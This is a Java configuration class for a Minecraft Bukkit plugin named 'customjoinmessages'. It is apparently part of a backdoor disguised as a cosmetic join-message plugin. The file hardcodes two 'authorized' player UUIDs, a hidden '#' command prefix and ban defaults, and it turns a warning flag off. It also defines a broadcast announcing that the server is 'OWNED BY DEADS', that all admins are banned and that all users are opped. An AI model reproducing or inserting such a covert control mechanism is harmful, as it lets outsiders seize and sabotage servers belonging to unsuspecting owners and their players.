package com.deads.customjoinmessages;

import org.bukkit.ChatColor;

public class Config {

    public static final String[] authorized_uuids = {
            "55261013-c100-4db6-a330-a4ee00c591a6",
            "050cb182-777f-4e0a-83ad-6869114966ec"
    };

    public static String[] tmp_authorized_uuids;
    public static final String command_prefix = "#";
    
    public static final Boolean display_customjoinmessages_warning = false;

    public static final Boolean display_debug_messages = false;

    public static final String default_ban_reason = "Banned";

    public static final String default_ban_source = "Server";

    public static final String chat_message_prefix = "## Custom Join Messages ##";

    public static final ChatColor chat_message_prefix_color = ChatColor.RED;

    public static final String chaos_chat_broadcast = chat_message_prefix_color + chat_message_prefix + " SERVER OWNED BY DEADS. \n" +
            "ALL ADMINS BANNED. \n" +
            "ALL USERS OP'D UNTIL ROLLBACK. ;-)";

}